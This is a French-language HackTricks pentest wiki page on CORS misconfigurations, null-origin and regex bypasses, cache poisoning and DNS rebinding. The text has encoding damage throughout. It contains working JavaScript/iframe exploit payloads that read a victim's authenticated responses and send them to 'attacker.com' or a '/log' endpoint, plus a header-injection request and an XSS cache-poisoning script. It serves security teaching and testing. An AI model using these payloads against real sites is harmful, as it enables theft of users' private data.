# CORS - Mauvaises configurations & Contournement

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Qu'est-ce que CORS?

Cross-Origin Resource Sharing (CORS) standard **permet aux serveurs de d√©finir qui peut acc√©der √† leurs ressources** et **quelles m√©thodes de requ√™te HTTP sont autoris√©es** √† partir de sources externes.

Une politique de **m√™me origine** exige qu'un **serveur demandant** une ressource et le serveur h√©bergeant la **ressource** partagent le m√™me protocole (par exemple, `http://`), nom de domaine (par exemple, `internal-web.com`), et **port** (par exemple, 80). Selon cette politique, seules les pages web du m√™me domaine et port sont autoris√©es √† acc√©der aux ressources.

L'application de la politique de m√™me origine dans le contexte de `http://normal-website.com/example/example.html` est illustr√©e comme suit :

| URL acc√©d√©e                              | Acc√®s autoris√©?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Oui : Sch√©ma, domaine et port identiques |
| `http://normal-website.com/example2/`     | Oui : Sch√©ma, domaine et port identiques |
| `https://normal-website.com/example/`     | Non : Sch√©ma et port diff√©rents           |
| `http://en.normal-website.com/example/`   | Non : Domaine diff√©rent                    |
| `http://www.normal-website.com/example/`  | Non : Domaine diff√©rent                    |
| `http://normal-website.com:8080/example/` | Non : Port diff√©rent\*                    |

\*Internet Explorer ignore le num√©ro de port dans l'application de la politique de m√™me origine, permettant ainsi cet acc√®s.

### En-t√™te `Access-Control-Allow-Origin`

Cet en-t√™te peut autoriser **plusieurs origines**, une valeur **`null`**, ou un joker **`*`**. Cependant, **aucun navigateur ne prend en charge plusieurs origines**, et l'utilisation du joker `*` est soumise √† des **limitations**. (Le joker doit √™tre utilis√© seul, et son utilisation avec `Access-Control-Allow-Credentials: true` n'est pas autoris√©e.)

Cet en-t√™te est **√©mis par un serveur** en r√©ponse √† une requ√™te de ressource entre domaines initi√©e par un site web, le navigateur ajoutant automatiquement un en-t√™te `Origin`.

### En-t√™te `Access-Control-Allow-Credentials`

Par **d√©faut**, les requ√™tes entre domaines sont effectu√©es sans informations d'identification telles que les cookies ou l'en-t√™te Authorization. Cependant, un serveur entre domaines peut autoriser la lecture de la r√©ponse lorsque des informations d'identification sont envoy√©es en d√©finissant l'en-t√™te `Access-Control-Allow-Credentials` sur **`true`**.

Si d√©fini sur `true`, le navigateur transmettra les informations d'identification (cookies, en-t√™tes d'autorisation ou certificats clients TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### Requ√™te de pr√©-v√©rification CSRF

### Comprendre les requ√™tes de pr√©-v√©rification dans la communication inter-domaines

Lors de l'initiation d'une requ√™te inter-domaines dans des conditions sp√©cifiques, telles que l'utilisation d'une **m√©thode HTTP non standard** (autre que HEAD, GET, POST), l'introduction de nouveaux **en-t√™tes**, ou l'utilisation d'une valeur sp√©ciale d'en-t√™te **Content-Type**, une requ√™te de pr√©-v√©rification peut √™tre n√©cessaire. Cette requ√™te pr√©liminaire, utilisant la m√©thode **`OPTIONS`**, sert √† informer le serveur des intentions de la future requ√™te inter-origines, y compris les m√©thodes HTTP et les en-t√™tes qu'elle compte utiliser.

Le protocole **Cross-Origin Resource Sharing (CORS)** impose cette v√©rification pr√©alable pour d√©terminer la faisabilit√© de l'op√©ration inter-origines demand√©e en v√©rifiant les m√©thodes autoris√©es, les en-t√™tes et la fiabilit√© de l'origine. Pour une compr√©hension d√©taill√©e des conditions qui contournent le besoin d'une requ√™te de pr√©-v√©rification, consultez le guide complet fourni par [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests).

Il est crucial de noter que **l'absence d'une requ√™te de pr√©-v√©rification ne supprime pas l'obligation pour la r√©ponse de contenir des en-t√™tes d'autorisation**. Sans ces en-t√™tes, le navigateur est incapable de traiter la r√©ponse de la requ√™te inter-origines.

Consid√©rez l'illustration suivante d'une requ√™te de pr√©-v√©rification visant √† utiliser la m√©thode `PUT` ainsi qu'un en-t√™te personnalis√© nomm√© `Special-Request-Header`:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
En r√©ponse, le serveur pourrait renvoyer des en-t√™tes indiquant les m√©thodes accept√©es, l'origine autoris√©e et d'autres d√©tails de la politique CORS, comme indiqu√© ci-dessous:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: Ce header sp√©cifie quels en-t√™tes peuvent √™tre utilis√©s lors de la requ√™te r√©elle. Il est d√©fini par le serveur pour indiquer les en-t√™tes autoris√©s dans les requ√™tes du client.
* **`Access-Control-Expose-Headers`**: √Ä travers ce header, le serveur informe le client des en-t√™tes qui peuvent √™tre expos√©s en plus des en-t√™tes de r√©ponse simples.
* **`Access-Control-Max-Age`**: Ce header indique pendant combien de temps les r√©sultats d'une requ√™te pr√©-vol peuvent √™tre mis en cache. Le serveur d√©finit le temps maximum, en secondes, pendant lequel les informations renvoy√©es par une requ√™te pr√©-vol peuvent √™tre r√©utilis√©es.
* **`Access-Control-Request-Headers`**: Utilis√© dans les requ√™tes pr√©-vol, ce header est d√©fini par le client pour informer le serveur des en-t√™tes HTTP que le client souhaite utiliser dans la requ√™te r√©elle.
* **`Access-Control-Request-Method`**: Ce header, √©galement utilis√© dans les requ√™tes pr√©-vol, est d√©fini par le client pour indiquer quelle m√©thode HTTP sera utilis√©e dans la requ√™te r√©elle.
* **`Origin`**: Ce header est automatiquement d√©fini par le navigateur et indique l'origine de la requ√™te entre domaines. Il est utilis√© par le serveur pour √©valuer si la requ√™te entrante doit √™tre autoris√©e ou refus√©e en fonction de la politique CORS.

Notez qu'en g√©n√©ral (selon le type de contenu et les en-t√™tes d√©finis), dans une requ√™te **GET/POST, aucune requ√™te pr√©-vol n'est envoy√©e** (la requ√™te est envoy√©e **directement**), mais si vous souhaitez acc√©der aux **en-t√™tes/au corps de la r√©ponse**, elle doit contenir un en-t√™te _Access-Control-Allow-Origin_ le permettant.\
**Par cons√©quent, CORS ne prot√®ge pas contre les CSRF (mais peut √™tre utile).**

### **Requ√™te pr√©-vol pour les demandes du r√©seau local**

1. **`Access-Control-Request-Local-Network`**: Ce header est inclus dans la requ√™te du client pour indiquer que la demande est destin√©e √† une ressource du r√©seau local. Il sert de marqueur pour informer le serveur que la demande provient du r√©seau local.
2. **`Access-Control-Allow-Local-Network`**: En r√©ponse, les serveurs utilisent ce header pour communiquer que la ressource demand√©e est autoris√©e √† √™tre partag√©e avec des entit√©s en dehors du r√©seau local. Il agit comme un feu vert pour le partage de ressources √† travers diff√©rentes fronti√®res r√©seau, garantissant un acc√®s contr√¥l√© tout en maintenant les protocoles de s√©curit√©.

Une **r√©ponse valide autorisant la demande du r√©seau local** doit √©galement contenir dans la r√©ponse l'en-t√™te `Access-Controls-Allow-Local_network: true` :
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Notez que l'IP linux **0.0.0.0** fonctionne pour **contourner** ces exigences afin d'acc√©der √† localhost car cette adresse IP n'est pas consid√©r√©e comme "locale".

Il est √©galement possible de **contourner les exigences du r√©seau local** si vous utilisez l'**adresse IP publique d'un point de terminaison local** (comme l'adresse IP publique du routeur). Car dans plusieurs occasions, m√™me si l'**IP publique** est acc√©d√©e, si c'est **√† partir du r√©seau local**, l'acc√®s sera accord√©.
{% endhint %}

## Configurations mal s√©curis√©es exploitables

Il a √©t√© observ√© que le param√©trage de `Access-Control-Allow-Credentials` √† **`true`** est une condition pr√©alable pour la plupart des **attaques r√©elles**. Ce param√®tre permet au navigateur d'envoyer des informations d'identification et de lire la r√©ponse, am√©liorant ainsi l'efficacit√© de l'attaque. Sans cela, l'avantage de faire √©mettre une requ√™te par un navigateur plut√¥t que de le faire soi-m√™me diminue, car l'exploitation des cookies d'un utilisateur devient irr√©alisable.

### Exception : Exploitation de l'emplacement du r√©seau comme authentification

Une exception existe lorsque l'emplacement du r√©seau de la victime agit comme une forme d'authentification. Cela permet √† un navigateur de la victime d'√™tre utilis√© comme proxy, contournant l'authentification bas√©e sur l'IP pour acc√©der aux applications intranet. Cette m√©thode pr√©sente des similitudes d'impact avec le rebinding DNS mais est plus simple √† exploiter.

### R√©flexion de `Origin` dans `Access-Control-Allow-Origin`

Le sc√©nario r√©el o√π la valeur de l'en-t√™te `Origin` est refl√©t√©e dans `Access-Control-Allow-Origin` est th√©oriquement improbable en raison des restrictions sur la combinaison de ces en-t√™tes. Cependant, les d√©veloppeurs cherchant √† activer CORS pour plusieurs URL peuvent g√©n√©rer dynamiquement l'en-t√™te `Access-Control-Allow-Origin` en copiant la valeur de l'en-t√™te `Origin`. Cette approche peut introduire des vuln√©rabilit√©s, en particulier lorsqu'un attaquant utilise un domaine avec un nom con√ßu pour sembler l√©gitime, trompant ainsi la logique de validation.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Exploiter l'origine `null`

L'origine `null`, sp√©cifi√©e pour des situations telles que les redirections ou les fichiers HTML locaux, occupe une position unique. Certaines applications ajoutent cette origine √† leur liste blanche pour faciliter le d√©veloppement local, permettant involontairement √† n'importe quel site web de simuler une origine `null` via un iframe sandbox√©, contournant ainsi les restrictions CORS.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Techniques de Contournement des Expressions R√©guli√®res

Lorsqu'on rencontre une liste blanche de domaines, il est crucial de tester les opportunit√©s de contournement, telles que l'ajout du domaine de l'attaquant √† un domaine autoris√© ou l'exploitation des vuln√©rabilit√©s de prise en charge de sous-domaines. De plus, les expressions r√©guli√®res utilis√©es pour la validation de domaine peuvent n√©gliger les subtilit√©s des conventions de nommage de domaine, offrant ainsi d'autres opportunit√©s de contournement.

### Contournements Avanc√©s des Expressions R√©guli√®res

Les mod√®les Regex se concentrent g√©n√©ralement sur les caract√®res alphanum√©riques, le point (.), et le tiret (-), en n√©gligeant d'autres possibilit√©s. Par exemple, un nom de domaine con√ßu pour inclure des caract√®res interpr√©t√©s diff√©remment par les navigateurs et les mod√®les Regex peut contourner les v√©rifications de s√©curit√©. La mani√®re dont Safari, Chrome et Firefox g√®rent les caract√®res de soulignement dans les sous-domaines illustre comment de telles divergences peuvent √™tre exploit√©es pour contourner la logique de validation de domaine.

**Pour plus d'informations et de param√®tres sur ce contr√¥le de contournement :** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **et** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (284).png>)

### Depuis XSS √† l'int√©rieur d'un sous-domaine

Les d√©veloppeurs mettent souvent en place des m√©canismes de d√©fense pour se prot√©ger contre l'exploitation de CORS en autorisant les domaines √† demander des informations. Malgr√© ces pr√©cautions, la s√©curit√© du syst√®me n'est pas infaillible. La pr√©sence d'un seul sous-domaine vuln√©rable parmi les domaines autoris√©s peut ouvrir la voie √† l'exploitation de CORS √† travers d'autres vuln√©rabilit√©s, telles que XSS (Cross-Site Scripting).

Pour illustrer, consid√©rez le sc√©nario o√π un domaine, `requester.com`, est autoris√© √† acc√©der aux ressources d'un autre domaine, `provider.com`. La configuration c√¥t√© serveur pourrait ressembler √† ceci :
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
Dans cette configuration, tous les sous-domaines de `requester.com` sont autoris√©s √† acc√©der. Cependant, si un sous-domaine, par exemple `sub.requester.com`, est compromis avec une vuln√©rabilit√© XSS, un attaquant peut exploiter cette faille. Par exemple, un attaquant ayant acc√®s √† `sub.requester.com` pourrait exploiter la vuln√©rabilit√© XSS pour contourner les politiques CORS et acc√©der de mani√®re malveillante aux ressources sur `provider.com`.

### **Empoisonnement du cache c√¥t√© serveur**

[**√Ä partir de cette recherche**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Il est possible qu'en exploitant l'empoisonnement du cache c√¥t√© serveur via l'injection d'en-t√™tes HTTP, une vuln√©rabilit√© XSS stock√©e puisse √™tre induite. Ce sc√©nario se d√©roule lorsque qu'une application ne parvient pas √† d√©sinfecter l'en-t√™te `Origin` des caract√®res ill√©gaux, cr√©ant une vuln√©rabilit√© particuli√®rement pour les utilisateurs d'Internet Explorer et Edge. Ces navigateurs consid√®rent (0x0d) comme un terminateur d'en-t√™te HTTP l√©gitime, entra√Ænant des vuln√©rabilit√©s d'injection d'en-t√™tes HTTP.

Consid√©rez la requ√™te suivante o√π l'en-t√™te `Origin` est manipul√© :
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer et Edge interpr√®tent la r√©ponse comme suit :
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Bien que l'exploitation directe de cette vuln√©rabilit√© en envoyant un en-t√™te malform√© depuis un navigateur web ne soit pas r√©alisable, une requ√™te personnalis√©e peut √™tre g√©n√©r√©e manuellement √† l'aide d'outils comme Burp Suite. Cette m√©thode pourrait entra√Æner la sauvegarde de la r√©ponse dans un cache c√¥t√© serveur et sa diffusion involontaire √† d'autres. La charge utile personnalis√©e vise √† modifier l'ensemble de caract√®res de la page en UTF-7, un encodage de caract√®res souvent associ√© aux vuln√©rabilit√©s XSS en raison de sa capacit√© √† encoder des caract√®res de mani√®re √† pouvoir √™tre ex√©cut√©s comme script dans certains contextes.

Pour plus d'informations sur les vuln√©rabilit√©s XSS stock√©es, consultez [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Remarque** : L'exploitation des vuln√©rabilit√©s d'injection d'en-t√™te HTTP, en particulier via l'empoisonnement du cache c√¥t√© serveur, souligne l'importance cruciale de valider et de d√©sinfecter toutes les entr√©es fournies par l'utilisateur, y compris les en-t√™tes HTTP. Employez toujours un mod√®le de s√©curit√© robuste qui inclut une validation des entr√©es pour pr√©venir de telles vuln√©rabilit√©s.

### **Empoisonnement du cache c√¥t√© client**

[**√Ä partir de cette recherche**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Dans ce sc√©nario, une instance d'une page web refl√©tant le contenu d'un en-t√™te HTTP personnalis√© sans codage appropri√© est observ√©e. Plus pr√©cis√©ment, la page web refl√®te le contenu inclus dans un en-t√™te `X-User-id`, qui pourrait inclure du JavaScript malveillant, comme le montre l'exemple o√π l'en-t√™te contient une balise d'image SVG con√ßue pour ex√©cuter du code JavaScript lors du chargement.

Les politiques de partage des ressources entre origines (CORS) permettent l'envoi d'en-t√™tes personnalis√©s. Cependant, sans que la r√©ponse soit directement rendue par le navigateur en raison des restrictions CORS, l'utilit√© d'une telle injection pourrait sembler limit√©e. Le point critique survient lors de la prise en compte du comportement du cache du navigateur. Si l'en-t√™te `Vary: Origin` n'est pas sp√©cifi√©, il devient possible que la r√©ponse malveillante soit mise en cache par le navigateur. Par la suite, cette r√©ponse mise en cache pourrait √™tre rendue directement lors de la navigation vers l'URL, contournant ainsi le besoin de rendu direct lors de la requ√™te initiale. Ce m√©canisme renforce la fiabilit√© de l'attaque en exploitant le cache c√¥t√© client.

Pour illustrer cette attaque, un exemple de JavaScript est fourni, con√ßu pour √™tre ex√©cut√© dans l'environnement d'une page web, par exemple via un JSFiddle. Ce script effectue une action simple : il envoie une requ√™te √† une URL sp√©cifi√©e avec un en-t√™te personnalis√© contenant le JavaScript malveillant. Apr√®s l'ach√®vement r√©ussi de la requ√™te, il tente de naviguer vers l URL cible, d√©clenchant potentiellement l'ex√©cution du script inject√© si la r√©ponse a √©t√© mise en cache sans une manipulation appropri√©e de l'en-t√™te `Vary: Origin`.

Voici un r√©sum√© du JavaScript utilis√© pour ex√©cuter cette attaque :
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Contournement

### XSSI (Inclusion de script inter-sites) / JSONP

XSSI, √©galement connu sous le nom d'Inclusion de script inter-sites, est un type de vuln√©rabilit√© qui profite du fait que la Politique de m√™me origine (SOP) ne s'applique pas lors de l'inclusion de ressources √† l'aide de la balise script. Cela est d√ª au fait que les scripts doivent pouvoir √™tre inclus √† partir de diff√©rents domaines. Cette vuln√©rabilit√© permet √† un attaquant d'acc√©der et de lire tout contenu qui a √©t√© inclus en utilisant la balise script.

Cette vuln√©rabilit√© devient particuli√®rement significative lorsqu'il s'agit de JavaScript dynamique ou de JSONP (JSON avec rembourrage), surtout lorsque des informations d'autorit√© ambiante comme les cookies sont utilis√©es pour l'authentification. Lors de la demande d'une ressource √† partir d'un h√¥te diff√©rent, les cookies sont inclus, ce qui les rend accessibles √† l'attaquant.

Pour mieux comprendre et att√©nuer cette vuln√©rabilit√©, vous pouvez utiliser le plugin BurpSuite disponible sur [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp). Ce plugin peut aider √† identifier et √† r√©soudre les vuln√©rabilit√©s XSSI potentielles dans vos applications web.

[**En savoir plus sur les diff√©rents types de XSSI et comment les exploiter ici.**](xssi-cross-site-script-inclusion.md)

Essayez d'ajouter un **`callback`** **param√®tre** dans la requ√™te. Peut-√™tre que la page √©tait pr√©par√©e pour envoyer les donn√©es sous forme de JSONP. Dans ce cas, la page renverra les donn√©es avec `Content-Type: application/javascript`, ce qui contournera la politique CORS.

![](<../.gitbook/assets/image (856).png>)

### Contournement facile (inutile ?)

Une fa√ßon de contourner la restriction `Access-Control-Allow-Origin` est de demander √† une application web de faire une requ√™te en votre nom et de renvoyer la r√©ponse. Cependant, dans ce sc√©nario, les informations d'identification de la victime finale ne seront pas envoy√©es car la requ√™te est faite √† partir d'un domaine diff√©rent.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape) : Cet outil fournit un proxy qui transmet votre requ√™te avec ses en-t√™tes, tout en falsifiant l'en-t√™te Origin pour correspondre au domaine demand√©. Cela contourne efficacement la politique CORS. Voici un exemple d'utilisation avec XMLHttpRequest :
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape) : Cet outil offre une approche alternative pour la mise en proxy des requ√™tes. Au lieu de transmettre votre requ√™te telle quelle, le serveur effectue sa propre requ√™te avec les param√®tres sp√©cifi√©s.

### Contournement Iframe + Popup

Vous pouvez **contourner les v√©rifications CORS** telles que `e.origin === window.origin` en **cr√©ant un iframe** et **en ouvrant une nouvelle fen√™tre √† partir de celui-ci**. Plus d'informations sur la page suivante :

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### R√©affectation DNS via TTL

La r√©affectation DNS via TTL est une technique utilis√©e pour contourner certaines mesures de s√©curit√© en manipulant les enregistrements DNS. Voici comment cela fonctionne :

1. L'attaquant cr√©e une page web et fait en sorte que la victime y acc√®de.
2. L'attaquant modifie ensuite le DNS (IP) de son propre domaine pour pointer vers la page web de la victime.
3. Le navigateur de la victime met en cache la r√©ponse DNS, qui peut avoir une valeur TTL (Time to Live) indiquant pendant combien de temps l'enregistrement DNS doit √™tre consid√©r√© comme valide.
4. Lorsque le TTL expire, le navigateur de la victime effectue une nouvelle requ√™te DNS, permettant √† l'attaquant d'ex√©cuter du code JavaScript sur la page de la victime.
5. En maintenant le contr√¥le sur l'IP de la victime, l'attaquant peut recueillir des informations de la victime sans envoyer de cookies au serveur de la victime.

Il est important de noter que les navigateurs disposent de m√©canismes de mise en cache qui peuvent emp√™cher l'abus imm√©diat de cette technique, m√™me avec des valeurs TTL faibles.

La r√©affectation DNS peut √™tre utile pour contourner les v√©rifications IP explicites effectu√©es par la victime ou pour des sc√©narios o√π un utilisateur ou un bot reste sur la m√™me page pendant une p√©riode prolong√©e, permettant √† la mise en cache d'expirer.

Si vous avez besoin d'un moyen rapide d'abuser de la r√©affectation DNS, vous pouvez utiliser des services comme [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Pour ex√©cuter votre propre serveur de r√©affectation DNS, vous pouvez utiliser des outils comme **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)). Cela implique d'exposer votre port local 53/udp, de cr√©er un enregistrement A pointant vers celui-ci (par exemple, ns.example.com), et de cr√©er un enregistrement NS pointant vers le sous-domaine A pr√©c√©demment cr√©√© (par exemple, ns.example.com). Tout sous-domaine du sous-domaine ns.example.com sera alors r√©solu par votre h√¥te.

Vous pouvez √©galement explorer un serveur en cours d'ex√©cution publiquement sur [http://rebind.it/singularity.html](http://rebind.it/singularity.html) pour une meilleure compr√©hension et exp√©rimentation.

### R√©affectation DNS via **Inondation du cache DNS**

La r√©affectation DNS via l'inondation du cache DNS est une autre technique utilis√©e pour contourner le m√©canisme de mise en cache des navigateurs et forcer une deuxi√®me requ√™te DNS. Voici comment cela fonctionne :

1. Initialement, lorsque la victime effectue une requ√™te DNS, elle re√ßoit l'adresse IP de l'attaquant en r√©ponse.
2. Pour contourner la d√©fense de mise en cache, l'attaquant exploite un service worker. Le service worker inonde le cache DNS, ce qui supprime efficacement le nom de serveur de l'attaquant mis en cache.
3. Lorsque le navigateur de la victime effectue une deuxi√®me requ√™te DNS, il re√ßoit maintenant l'adresse IP 127.0.0.1, qui fait g√©n√©ralement r√©f√©rence √† l'localhost.

En inondant le cache DNS avec le service worker, l'attaquant peut manipuler le processus de r√©solution DNS et forcer le navigateur de la victime √† effectuer une deuxi√®me requ√™te, cette fois-ci r√©solvant vers l'adresse IP souhait√©e par l'attaquant.

### R√©affectation DNS via **Cache**

Une autre fa√ßon de contourner la d√©fense de mise en cache est d'utiliser plusieurs adresses IP pour le m√™me sous-domaine dans le fournisseur DNS. Voici comment cela fonctionne :

1. L'attaquant configure deux enregistrements A (ou un seul enregistrement A avec deux IPs) pour le m√™me sous-domaine dans le fournisseur DNS.
2. Lorsqu'un navigateur v√©rifie ces enregistrements, il re√ßoit les deux adresses IP.
3. Si le navigateur d√©cide d'utiliser en premier l'adresse IP de l'attaquant, l'attaquant peut servir une charge utile qui effectue des requ√™tes HTTP vers le m√™me domaine.
4. Cependant, une fois que l'attaquant obtient l'adresse IP de la victime, il cesse de r√©pondre au navigateur de la victime.
5. Le navigateur de la victime, en r√©alisant que le domaine est injoignable, passe √† utiliser la deuxi√®me adresse IP donn√©e.
6. En acc√©dant √† la deuxi√®me adresse IP, le navigateur contourne la Politique de m√™me origine (SOP), permettant √† l'attaquant d'exploiter cela et de recueillir et d'extraire des informations.

Cette technique exploite le comportement des navigateurs lorsque plusieurs adresses IP sont fournies pour un domaine. En contr√¥lant strat√©giquement les r√©ponses et en manipulant le choix de l'adresse IP par le navigateur, un attaquant peut exploiter la SOP et acc√©der aux informations de la victime.

{% hint style="warning" %}
Notez que pour acc√©der √† localhost, vous devriez essayer de r√©affecter **127.0.0.1** sous Windows et **0.0.0.0** sous Linux.\
Des fournisseurs tels que godaddy ou cloudflare ne m'ont pas permis d'utiliser l'IP 0.0.0.0, mais AWS route53 m'a permis de cr√©er un enregistrement A avec 2 IPs, l'une d'entre elles √©tant "0.0.0.0"

<img src="../.gitbook/assets/image (140).png" alt="" data-size="original">
{% endhint %}

Pour plus d'informations, vous pouvez consulter [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)
### Autres contournements courants

* Si les **adresses IP internes ne sont pas autoris√©es**, ils ont peut-√™tre **oubli√© d'interdire 0.0.0.0** (fonctionne sur Linux et Mac)
* Si les **adresses IP internes ne sont pas autoris√©es**, r√©pondez avec un **CNAME** vers **localhost** (fonctionne sur Linux et Mac)
* Si les **adresses IP internes ne sont pas autoris√©es** en tant que r√©ponses DNS, vous pouvez r√©pondre avec des **CNAME vers des services internes** tels que www.corporate.internal.

### Arme DNS Rebidding Weaponized

Vous pouvez trouver plus d'informations sur les techniques de contournement pr√©c√©dentes et comment utiliser l'outil suivant dans la pr√©sentation [Gerald Doussot - √âtat des attaques de rebinding DNS & Singularit√© de l'origine - Conf√©rence DEF CON 27](https://www.youtube.com/watch?v=y9-0lICNjOQ).

[**`Singularit√© de l'origine`**](https://github.com/nccgroup/singularity) est un outil pour effectuer des attaques de [rebinding DNS](https://en.wikipedia.org/wiki/DNS\_rebinding). Il comprend les composants n√©cessaires pour r√©affecter l'adresse IP du nom DNS du serveur d'attaque √† l'adresse IP de la machine cible et pour servir des charges utiles d'attaque pour exploiter des logiciels vuln√©rables sur la machine cible.

### Protection r√©elle contre le rebinding DNS

* Utilisez TLS dans les services internes
* Demandez une authentification pour acc√©der aux donn√©es
* Validez l'en-t√™te Host
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Proposition d'envoyer toujours une requ√™te pr√©alable lorsque des serveurs publics veulent acc√©der √† des serveurs internes

## **Outils**

**Fuzz les mauvaises configurations possibles dans les politiques CORS**

* [https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8](https://portswigger.net/bappstore/420a28400bad4c9d85052f8d66d3bbd8)
* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)
* [https://github.com/omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne)

## R√©f√©rences

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
